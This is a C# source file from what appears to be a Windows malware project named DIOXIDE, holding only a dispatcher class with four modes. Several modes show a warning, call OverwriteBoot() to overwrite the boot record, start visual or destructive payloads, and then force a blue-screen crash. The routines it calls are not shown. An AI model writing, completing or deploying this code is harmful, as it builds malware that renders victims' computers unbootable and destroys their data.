using System;
using System.Threading;
using System.Windows.Forms;
using DIOXIDE.Properties;
using DIOXIDE;

namespace DIOXIDE
{
    class execute
    {
        public static void executeEWP()
        {
            destruction destruction = new destruction();
            payloads payloads = new payloads();

            Application.EnableVisualStyles();

            destruction.WARNING();

            Thread.Sleep(5000);

            run_payloads.PStart();

            Environment.Exit(0);
        }
        public static void executeNWD()
        {
            destruction destruction = new destruction();
            payloads payloads = new payloads();

            Application.EnableVisualStyles();

            destruction.OverwriteBoot();

            Thread.Sleep(5000);

            run_payloads.DStart();

            destruction.BSOD();
        }
        public unsafe static void executeP()
        {
            payloads payloads = new payloads();
            run_payloads run_payloads = new run_payloads();

            Application.EnableVisualStyles();

            Thread.Sleep(5000);

            run_payloads.PStart();

            System.Environment.Exit(0);
        }
        public static void executeD()
        {
            destruction destruction = new destruction();
            payloads payloads = new payloads();

            Application.EnableVisualStyles();

            destruction.WARNING();

            destruction.OverwriteBoot();

            Thread.Sleep(5000);

            run_payloads.DStart();

            destruction.BSOD();
        }
    }
}
